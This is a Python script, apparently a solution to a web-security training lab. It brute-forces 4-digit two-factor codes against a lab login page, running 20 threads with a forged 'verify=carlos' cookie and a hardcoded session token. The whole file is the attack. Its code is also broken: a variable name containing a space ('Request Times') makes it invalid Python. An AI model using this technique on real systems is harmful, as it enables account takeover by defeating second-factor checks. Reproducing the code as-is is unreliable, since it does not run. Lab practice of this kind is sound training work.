#Author: MeowHecker 侯智晟
# Bypass 2FA Auth
import requests
import threading
import sys 

url = "https://0ae900ed033f23288166aceb000b003c.web-security-academy.net/login2"

Headers = {'Host': ' 0ae900ed033f23288166aceb000b003c.web-security-academy.net', 'Cookie': ' verify=carlos; session=706d8zav60yMRSaANT9QUOdIQVYkXLhw', 'Content-Length': ' 13', 'Cache-Control': ' max-age=0', 'Sec-Ch-Ua': ' "Not_A Brand";v="8", "Chromium";v="120"', 'Sec-Ch-Ua-Mobile': ' ?0', 'Sec-Ch-Ua-Platform': ' "Windows"', 'Upgrade-Insecure-Requests': ' 1', 'Origin': ' https://0ae900ed033f23288166aceb000b003c.web-security-academy.net', 'Content-Type': ' application/x-www-form-urlencoded', 'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36', 'Accept': ' text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Sec-Fetch-Site': ' same-origin', 'Sec-Fetch-Mode': ' navigate', 'Sec-Fetch-User': ' ?1', 'Sec-Fetch-Dest': ' document', 'Referer': ' https://0ae900ed033f23288166aceb000b003c.web-security-academy.net/login2', 'Accept-Encoding': ' gzip, deflate, br', 'Accept-Language': ' zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'Priority': ' u=0, i'}

Request Times = 0
def sendRequest(payload,sem): 
    
    global Request Times 
    payloads = {
        "Payload": payload
    }
    # Send request and save Response 
    response = requests.post(url,headers = Headers,data=payloads)
    
    print(f'Request Times{Request Times}:stauts code:{response.status_code} payloads: {payload}')

    Request Times = Request Times + 1

     # Target / Success ? (Status code)
    if(response.status_code != 200): # Found !!!!!!!
        print(f"Payload: {payload}, Response: {response.text}")
        sys.exit()  
   
    
    sem.release()  # Release Singal  
    sys.exit() # Termerate Threading Process 


def threadingF():

    maxThreading = 20
    sem = threading.BoundedSemaphore(maxThreading)

    for i in range(10000):
        
        # Custom Payload 
        payload = str(i).zfill(4)

        sem.acquire() 
        sendRequestHandler = threading.Thread(target=sendRequest, args=(payload,sem))
        sendRequestHandler.start()
        print("Number of active threads:", threading.active_count())

    sys.exit()
  
threadingF()
sys.exit()